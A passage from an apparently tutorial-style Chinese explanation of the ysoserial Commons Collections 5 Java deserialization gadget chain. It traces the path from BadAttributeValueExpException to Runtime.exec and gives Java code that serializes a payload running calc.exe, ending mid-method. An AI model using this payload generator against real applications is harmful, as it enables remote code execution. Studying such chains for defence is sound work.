Commons Collections5链（CC5）是ysoserial中针对Commons Collections 3.1的利用链，其核心触发点是BadAttributeValueExpException类的readObject方法。BadAttributeValueExpException是JMX中的一个异常类，其readObject方法会调用toString()方法，而toString()方法会返回val属性的字符串表示。如果val是一个LazyMap，那么调用toString()时会触发LazyMap.get()，进而执行Transformer链。CC5链的完整路径：BadAttributeValueExpException.readObject -> toString() -> LazyMap.get() -> ChainedTransformer.transform() -> InvokerTransformer.transform() -> Runtime.exec()。与CC1不同，CC5不需要AnnotationInvocationHandler，因此不受JDK版本限制（只要Commons Collections 3.1存在）。简化代码示例如下：

java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

public class CC5Exploit {
    public static void main(String[] args) throws Exception {
        // 构造Transformer链
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建LazyMap
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

        // 创建BadAttributeValueExpException并设置val为lazyMap
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        java.lang.reflect.Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(exception, lazyMap);

        // 序列化
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(new java.io.FileOutputStream("cc5.ser"));
        oos.writeObject(exception);
        oos.close();
